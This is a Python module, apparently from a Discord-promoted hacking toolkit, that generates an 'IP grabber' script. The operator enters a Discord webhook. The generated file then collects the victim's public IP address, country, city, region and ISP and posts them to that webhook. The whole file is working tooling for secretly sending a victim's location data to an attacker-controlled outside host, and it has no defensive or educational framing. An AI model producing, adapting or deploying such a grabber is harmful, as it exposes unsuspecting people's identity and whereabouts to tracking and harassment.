from Helper import *
from Helper.Common.utils import *

def make_ip_grabber():
    new_title("Ip grabber discord.gg/nexustools")
    webhook_input = input(f"{Fore.RESET}[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Input Your discord webhook: ")
    code = r"""
import requests

def get_ip():
    r = requests.get("https://api.ipify.org/")
    ip = r.text
    return ip

def get_geo(ip):
    response = requests.get(f"http://ip-api.com/json/{ip}")
    data = response.json()
    country = data['country']
    city =  data['city']
    region_name = data['regionName']
    ISP =  data['isp']
    return country, city, region_name, ISP

def grab_ip():
    ip = get_ip()
    country, city, region_name, ISP = get_geo(ip)
    message = {
        "content": " ",
        "embeds": [
            {
                "title": "Ip Grabber",
                "description": f"IP: {ip}",
                "color": 0xADD8E6,
                "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1209895707675205653/1209919950689411092/RmDJt7xVhNFTA6yvy3EWfsTbki45EeI67K93h75F_1.png?ex=66294643&is=6616d143&hm=8cce712a285d32b65a312791f34629121b3c8a37fedecf3f64c4372bfe4c004c&"},
    "fields": [
        {"name": "Country", "value": country},
        {"name": "City", "value": city},
        {"name": "Region", "value": region_name},
        {"name": "ISP", "value": ISP}
    ],

                "footer": {
                    "text": "discord.gg/nexustools"
                }
            }
        ]
    }
    requests.post("{webhook}", json=message)

grab_ip()
"""

    code = code.replace("{webhook}", webhook_input)
    with open ("Output/Danger/ip_grabber.py", "w", encoding="utf-8") as file:
        file.write(code)
    print(f"{lc} Ip grabber file succsefully Created in Output/Danger/ip_grabber.py!")
    input("Press Enter To continue...")


